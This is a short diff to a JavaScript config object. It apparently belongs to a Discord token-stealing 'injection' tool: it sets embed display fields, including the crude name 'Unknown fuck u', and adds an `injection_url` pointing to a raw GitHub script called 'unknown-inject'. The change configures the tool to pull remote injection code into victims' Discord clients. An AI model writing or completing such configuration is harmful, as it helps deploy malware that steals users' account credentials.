@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Unknown fuck u', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1084469145384521758/1089132390217162752/example.JPG'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/ishrak3232/unknown-inject/main/index.js', 
   /**
    
    **/
